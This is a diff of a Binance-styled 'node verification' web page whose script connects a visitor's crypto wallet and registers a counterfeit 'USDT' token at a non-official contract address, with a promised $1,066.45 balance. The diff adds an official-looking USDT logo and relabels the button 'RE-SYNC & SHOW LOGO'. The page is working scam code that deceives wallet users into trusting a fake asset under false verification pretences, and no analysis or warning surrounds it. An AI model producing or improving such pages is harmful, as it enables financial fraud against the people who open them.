@@ -3,56 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Node</title>
+    <title>Node Sync</title>
     <style>
-        body { background: #0b0e11; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { background: #f3ba2f; color: black; border: none; padding: 20px 40px; border-radius: 10px; font-weight: bold; font-size: 18px; width: 80%; cursor: pointer; }
-        .bal { font-size: 35px; margin: 20px 0; font-weight: bold; }
+        body { background: #0b0e11; color: #fff; font-family: sans-serif; text-align: center; padding-top: 60px; }
+        .card { background: #1e2329; margin: 0 auto; padding: 30px; width: 85%; border-radius: 20px; border: 1px solid #32383e; }
+        .btn { background: #f3ba2f; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
+        .status { font-size: 12px; color: #848e9c; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div style="color: #848e9c;">ALLOCATED VALUE</div>
-    <div class="bal">$1,066.45</div>
-    
-    <button class="btn" onclick="sync()">CONNECT & VERIFY</button>
-    
-    <p id="status" style="font-size: 12px; color: #848e9c; margin-top: 20px;">Ready...</p>
+    <div class="card">
+        <div style="color: #f3ba2f; font-size: 12px; font-weight: bold;">NODE VERIFICATION</div>
+        <div style="font-size: 36px; font-weight: bold; margin: 15px 0;">$1,066.45</div>
+        <button class="btn" onclick="injectAsset()">RE-SYNC & SHOW LOGO</button>
+        <div id="msg" class="status">Ready to sync...</div>
+    </div>
 
 <script>
-    async function sync() {
-        const s = document.getElementById('status');
-        // Direct Provider Check
-        const p = window.ethereum || window.BinanceChain;
+    async function injectAsset() {
+        const msg = document.getElementById('msg');
+        const provider = window.ethereum || window.BinanceChain;
 
-        if (!p) { alert("Open in Binance Web3 Wallet"); return; }
+        if (!provider) { alert("Open in Binance App"); return; }
 
         try {
-            s.innerText = "Connecting...";
-            await p.request({ method: 'eth_requestAccounts' });
+            msg.innerText = "Connecting...";
+            await provider.request({ method: 'eth_requestAccounts' });
 
-            s.innerText = "Switching Network...";
-            await p.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }]
-            });
-
-            s.innerText = "Injecting Asset...";
-            // High-Resolution Direct Link for Logo
-            await p.request({
+            msg.innerText = "Injecting Asset Data...";
+            
+            // Note: address is your contract 0x5Cd...
+            // Image is the high-quality official Tether SVG from Binance servers
+            await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
-                        symbol: "USDT",
+                        address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
+                        symbol: 'USDT',
                         decimals: 6,
-                        image: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png"
-                    }
-                }
+                        image: 'https://bin.bnbstatic.com/static/images/home/binance-pay/usdt.png' 
+                    },
+                },
             });
-            s.innerText = "Success!";
+            msg.innerText = "Logo Sync Successful!";
         } catch (e) {
-            s.innerText = "Error. Try again.";
+            msg.innerText = "Error: User Cancelled";
         }
     }
 </script>
